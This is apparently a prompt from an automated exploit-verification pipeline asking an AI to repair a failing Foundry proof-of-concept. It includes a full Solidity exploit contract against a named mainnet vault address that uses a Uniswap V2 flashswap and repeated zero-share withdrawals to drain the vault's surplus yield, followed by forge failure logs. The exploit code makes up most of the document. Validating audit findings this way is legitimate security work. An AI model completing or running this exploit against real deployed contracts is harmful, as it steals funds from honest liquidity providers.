You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Small withdrawals can redeem assets while burning zero shares
- claim: `withdraw()` first checks the caller's entitlement in asset terms via `convertToAssets(balanceOf(msg.sender))`, but then computes `shares = (totalSupply() * assets) / totalAssets()` with floor rounding and never requires `shares > 0`. Whenever `totalAssets() > totalSupply()`, sufficiently small `assets` values can pass the entitlement check while rounding the burned share amount down to zero.
- impact: A shareholder can repeatedly withdraw small amounts of underlying without reducing their share balance, draining accrued yield or other surplus from the vault and stealing value from honest LPs.
- exploit_paths: ["Vault accrues yield so that `totalAssets() > totalSupply()`.", "Attacker acquires any positive share balance.", "Attacker repeatedly calls `withdraw()` with small `assets` values such that `convertToAssets(balanceOf(attacker)) >= assets` but `(totalSupply() * assets) / totalAssets() == 0`."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IEFVault {
    function deposit(uint256 assets, address receiver) external payable returns (uint256 shares);
    function withdraw(uint256 assets, address receiver) external returns (uint256 shares);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function maxDeposit() external view returns (uint256);
    function maxWithdraw() external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    IEFVault internal constant TARGET = IEFVault(0x863e572B215Fd67C855d973F870266cF827AEa5e);
    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // Uniswap V2 WETH/USDC pair. This is only used to source the minimum real
    // ETH needed to buy the first share through a deterministic flashswap.
    // That funding step does not change exploit causality; it only bootstraps
    // the required path stage where the attacker acquires any positive share balance.
    IUniswapV2Pair internal constant UNI_V2_WETH_USDC =
        IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);

    uint256 internal _profitAmount;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external payable {
        uint256 startingValue = _wethEquivalentBalance();

        // Exploit path stage 1:
        // Vault accrues yield so that totalAssets() > totalSupply().
        if (!_vaultAccruedYieldSurplus()) {
            _finalizeProfit(startingValue);
            return;
        }

        // Exploit path stage 2:
        // Attacker acquires any positive share balance.
        _acquireAnyPositiveShareBalance();

        if (TARGET.balanceOf(address(this)) != 0) {
            // Exploit path stage 3:
            // Attacker repeatedly calls withdraw() with small assets values such
            // that convertToAssets(balanceOf(attacker)) >= assets but
            // (totalSupply() * assets) / totalAssets() == 0.
            _repeatedlyWithdrawSmallAssetsWithoutBurningShares();

            // After the zero-burn loop has drained surplus, withdraw the
            // legitimately owned remainder to realize profit.
            _redeemRemainingShares();
        }

        _finalizeProfit(startingValue);
    }

    function profitToken() external pure returns (address) {
        return address(WETH);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == address(UNI_V2_WETH_USDC), "unauthorized pair");
        require(sender == address(this), "unauthorized sender");

        uint256 borrowedWeth = abi.decode(data, (uint256));
        uint256 receivedWeth = amount0 > 0 ? amount0 : amount1;
        require(receivedWeth == borrowedWeth, "unexpected flashswap");

        WETH.withdraw(borrowedWeth);

        bool acquiredShares = _attemptDirectDeposit(borrowedWeth);
        require(acquiredShares, "entry deposit failed");

        _repeatedlyWithdrawSmallAssetsWithoutBurningShares();
        _redeemRemainingShares();

        uint256 repayAmount = _uniswapV2RepayAmount(borrowedWeth);
        require(address(this).balance >= repayAmount, "insufficient repay balance");

        WETH.deposit{value: repayAmount}();
        require(WETH.transfer(address(UNI_V2_WETH_USDC), repayAmount), "repay failed");
    }

    function _vaultAccruedYieldSurplus() internal view returns (bool) {
        return TARGET.totalAssets() > TARGET.totalSupply();
    }

    function _acquireAnyPositiveShareBalance() internal {
        if (TARGET.balanceOf(address(this)) != 0) {
            return;
        }

        uint256 minimumAssetsForOneShare = _entryFundingNeeded();
        if (minimumAssetsForOneShare == 0) {
            return;
        }

        if (!_attemptDirectDeposit(minimumAssetsForOneShare)) {
            _attemptFlashswap(minimumAssetsForOneShare);
        }
    }

    function _repeatedlyWithdrawSmallAssetsWithoutBurningShares() internal {
        address attacker = address(this);

        for (uint256 i = 0; i < 4096; ++i) {
            if (!_vaultAccruedYieldSurplus()) {
                break;
            }

            if (TARGET.balanceOf(attacker) == 0) {
                break;
            }

            uint256 assets = _smallWithdrawAmount(attacker);
            if (assets == 0) {
                break;
            }

            // Match the finding precisely:
            // convertToAssets(balanceOf(attacker)) >= assets
            if (!(TARGET.convertToAssets(TARGET.balanceOf(attacker)) >= assets)) {
                break;
            }

            // Match the finding precisely:
            // (totalSupply() * assets) / totalAssets() == 0
            if (!(((TARGET.totalSupply() * assets) / TARGET.totalAssets()) == 0)) {
                break;
            }

            (bool ok, bytes memory data) =
                address(TARGET).call(abi.encodeWithSelector(TARGET.withdraw.selector, assets, attacker));
            if (!ok) {
                break;
            }

            uint256 burnedShares = data.length >= 32 ? abi.decode(data, (uint256)) : 0;
            if (burnedShares != 0) {
                break;
            }
        }
    }

    function _redeemRemainingShares() internal {
        address attacker = address(this);

        for (uint256 i = 0; i < 16; ++i) {
            uint256 shares = TARGET.balanceOf(attacker);
            if (shares == 0) {
                break;
            }

            uint256 assets = TARGET.convertToAssets(shares);
            if (assets == 0) {
                break;
            }

            uint256 cappedAssets = assets;
            uint256 maxWithdraw = _safeMaxWithdraw();
            if (maxWithdraw != type(uint256).max) {
                cappedAssets = _min(cappedAssets, maxWithdraw);
            }

            if (cappedAssets == 0) {
                break;
            }

            (bool ok,) =
                address(TARGET).call(abi.encodeWithSelector(TARGET.withdraw.selector, cappedAssets, attacker));
            if (!ok) {
                break;
            }
        }
    }

    function _smallWithdrawAmount(address attacker) internal view returns (uint256) {
        uint256 totalSupply_ = TARGET.totalSupply();
        uint256 totalAssets_ = TARGET.totalAssets();

        if (totalSupply_ == 0 || totalAssets_ <= totalSupply_) {
            return 0;
        }

        uint256 assets = (totalAssets_ - 1) / totalSupply_;
        if (assets == 0) {
            return 0;
        }

        uint256 entitled = TARGET.convertToAssets(TARGET.balanceOf(attacker));
        if (entitled < assets) {
            assets = entitled;
        }

        uint256 maxWithdraw = _safeMaxWithdraw();
        if (maxWithdraw != type(uint256).max) {
            assets = _min(assets, maxWithdraw);
        }

        return assets;
    }

    function _attemptDirectDeposit(uint256 assets) internal returns (bool) {
        if (assets == 0 || address(this).balance < assets) {
            return false;
        }

        uint256 maxDeposit = _safeMaxDeposit();
        if (maxDeposit != type(uint256).max) {
            assets = _min(assets, maxDeposit);
        }

        if (assets == 0 || address(this).balance < assets) {
            return false;
        }

        uint256 sharesBefore = TARGET.balanceOf(address(this));
        (bool ok,) =
            address(TARGET).call{value: assets}(abi.encodeWithSelector(TARGET.deposit.selector, assets, address(this)));
        if (!ok) {
            return false;
        }

        return TARGET.balanceOf(address(this)) > sharesBefore;
    }

    function _attemptFlashswap(uint256 requiredEth) internal {
        if (requiredEth == 0) {
            return;
        }

        address token0 = UNI_V2_WETH_USDC.token0();
        address token1 = UNI_V2_WETH_USDC.token1();

        uint256 amount0Out = token0 == address(WETH) ? requiredEth : 0;
        uint256 amount1Out = token1 == address(WETH) ? requiredEth : 0;
        require(amount0Out != 0 || amount1Out != 0, "weth missing");

        try UNI_V2_WETH_USDC.swap(amount0Out, amount1Out, address(this), abi.encode(requiredEth)) {} catch {}
    }

    function _entryFundingNeeded() internal view returns (uint256) {
        uint256 totalSupply_ = TARGET.totalSupply();
        uint256 totalAssets_ = TARGET.totalAssets();

        if (totalSupply_ == 0) {
            return totalAssets_ > 0 ? 1 : 0;
        }

        if (totalAssets_ <= totalSupply_) {
            return 0;
        }

        return ((totalAssets_ - 1) / totalSupply_) + 1;
    }

    function _finalizeProfit(uint256 startingValue) internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            WETH.deposit{value: ethBalance}();
        }

        uint256 endingValue = WETH.balanceOf(address(this));
        if (endingValue > startingValue) {
            _profitAmount = endingValue - startingValue;
        } else {
            _profitAmount = 0;
        }
    }

    function _safeMaxDeposit() internal view returns (uint256) {
        (bool ok, bytes memory data) = address(TARGET).staticcall(abi.encodeWithSelector(TARGET.maxDeposit.selector));
        if (!ok || data.length < 32) {
            return type(uint256).max;
        }
        return abi.decode(data, (uint256));
    }

    function _safeMaxWithdraw() internal view returns (uint256) {
        (bool ok, bytes memory data) = address(TARGET).staticcall(abi.encodeWithSelector(TARGET.maxWithdraw.selector));
        if (!ok || data.length < 32) {
            return type(uint256).max;
        }
        return abi.decode(data, (uint256));
    }

    function _uniswapV2RepayAmount(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _wethEquivalentBalance() internal view returns (uint256) {
        return WETH.balanceOf(address(this)) + address(this).balance;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.94s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 21455)
Traces:
  [21455] FlawVerifierTest::testExploit()
    ├─ [234] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [8942] FlawVerifier::executeOnOpportunity()
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [5052] 0x863e572B215Fd67C855d973F870266cF827AEa5e::totalAssets() [staticcall]
    │   │   └─ ← [Revert] call to non-contract address 0x0000000000000000000000000000000000000000
    │   └─ ← [Revert] call to non-contract address 0x0000000000000000000000000000000000000000
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x863e572B215Fd67C855d973F870266cF827AEa5e.totalAssets
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 282.21ms (9.42ms CPU time)

Ran 1 test suite in 387.23ms (282.21ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 21455)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
